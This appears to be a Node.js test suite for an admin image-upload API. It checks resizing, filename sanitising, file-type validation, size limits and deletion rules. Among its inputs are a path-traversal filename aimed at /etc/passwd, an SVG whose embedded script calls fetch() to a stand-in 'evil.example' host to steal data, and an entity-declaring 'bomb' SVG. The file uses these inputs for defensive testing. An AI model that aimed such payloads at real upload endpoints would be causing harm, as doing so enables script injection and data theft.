'use strict';
const test = require('node:test');
const assert = require('node:assert');
const fs = require('node:fs');
const fsp = fs.promises;
const path = require('node:path');
const sharp = require('sharp');
const { startServer } = require('./helpers');

async function pngBuffer(width = 900, height = 400) {
  return sharp({
    create: { width, height, channels: 3, background: { r: 20, g: 30, b: 60 } }
  }).png().toBuffer();
}

function form(buffer, filename, type, kind) {
  const fd = new FormData();
  fd.append('kind', kind);
  fd.append('file', new Blob([buffer], { type }), filename);
  return fd;
}

test('uploads', async (t) => {
  const srv = await startServer();
  t.after(() => srv.stop());
  const { client } = await srv.signIn();

  await t.test('a real PNG is accepted and resized', async () => {
    const res = await client.post('/api/admin/uploads',
      form(await pngBuffer(), 'Sponsor Logo.png', 'image/png', 'logo'), { raw: true });
    assert.strictEqual(res.status, 201);
    assert.ok(res.body.ref.logo, 'should return a logo path');
    assert.ok(res.body.ref.logoWebp, 'should return a webp sibling');
    assert.match(res.body.ref.logo, /^assets\/img\/uploads\//);

    const onDisk = path.join(srv.config.uploadDir, path.basename(res.body.ref.logo));
    const meta = await sharp(onDisk).metadata();
    assert.ok(meta.width <= 600 && meta.height <= 400, `resized to ${meta.width}x${meta.height}`);
  });

  await t.test('the client filename is never used verbatim', async () => {
    const res = await client.post('/api/admin/uploads',
      form(await pngBuffer(), '../../../etc/passwd.png', 'image/png', 'logo'), { raw: true });
    assert.strictEqual(res.status, 201);
    const stored = path.basename(res.body.ref.logo);
    assert.ok(!stored.includes('..'), stored);
    assert.ok(stored.startsWith('passwd-'), `expected a sanitised name, got ${stored}`);

    const files = await fsp.readdir(srv.config.uploadDir);
    assert.ok(files.includes(stored));
    /* And nothing escaped the uploads directory. */
    const parent = await fsp.readdir(path.dirname(srv.config.uploadDir));
    assert.ok(!parent.includes('passwd.png'));
  });

  await t.test('text renamed .png is refused', async () => {
    const res = await client.post('/api/admin/uploads',
      form(Buffer.from('this is not an image, it is a sentence'), 'sneaky.png', 'image/png', 'logo'),
      { raw: true });
    assert.strictEqual(res.status, 415);
    assert.match(res.body.message, /not a PNG/i);
  });

  await t.test('a real PNG declared as something else is refused', async () => {
    const res = await client.post('/api/admin/uploads',
      form(await pngBuffer(), 'logo.webp', 'image/webp', 'logo'), { raw: true });
    assert.strictEqual(res.status, 415);
    assert.match(res.body.message, /contents are png/i);
  });

  await t.test('an SVG carrying a script is stored as a PNG with no script in it', async () => {
    const svg = Buffer.from(
      '<svg xmlns="http://www.w3.org/2000/svg" width="200" height="100">' +
      '<script>fetch("https://evil.example/steal")</script>' +
      '<rect width="200" height="100" fill="#123"/></svg>'
    );
    const res = await client.post('/api/admin/uploads',
      form(svg, 'logo.svg', 'image/svg+xml', 'logo'), { raw: true });
    assert.strictEqual(res.status, 201);

    const stored = path.join(srv.config.uploadDir, path.basename(res.body.ref.logo));
    const bytes = await fsp.readFile(stored);
    assert.strictEqual(bytes.slice(1, 4).toString('latin1'), 'PNG', 'must be rasterised');
    assert.ok(!bytes.includes(Buffer.from('evil.example')), 'the payload must be gone');
    assert.ok(!bytes.includes(Buffer.from('<script')), 'no script markup may survive');
  });

  await t.test('an SVG with a DOCTYPE is refused outright', async () => {
    const svg = Buffer.from(
      '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY a "aaaaaaaaaa">]>' +
      '<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><rect width="10" height="10"/></svg>'
    );
    const res = await client.post('/api/admin/uploads',
      form(svg, 'bomb.svg', 'image/svg+xml', 'logo'), { raw: true });
    assert.strictEqual(res.status, 415);
    assert.match(res.body.message, /document type/i);
  });

  await t.test('a file over the size cap is refused', async () => {
    const srv2 = await startServer({ uploadMaxBytes: 2048 });
    try {
      const { client: c } = await srv2.signIn();
      const res = await c.post('/api/admin/uploads',
        form(await pngBuffer(1200, 900), 'big.png', 'image/png', 'logo'), { raw: true });
      assert.strictEqual(res.status, 413);
    } finally {
      await srv2.stop();
    }
  });

  await t.test('an upload still in use cannot be deleted', async () => {
    const res = await client.post('/api/admin/uploads',
      form(await pngBuffer(), 'inuse.png', 'image/png', 'logo'), { raw: true });
    const logoPath = res.body.ref.logo;

    const content = (await client.get('/api/admin/content')).body.data;
    const sponsor = content.sponsors.find((s) => s.id === 'crystal');
    await client.put('/api/admin/sponsors/crystal', {
      value: { ...sponsor, logo: logoPath, logoWebp: res.body.ref.logoWebp }
    });

    const blocked = await client.del('/api/admin/uploads/' + path.basename(logoPath));
    assert.strictEqual(blocked.status, 409);
    assert.match(blocked.body.message, /still used/i);
  });
});
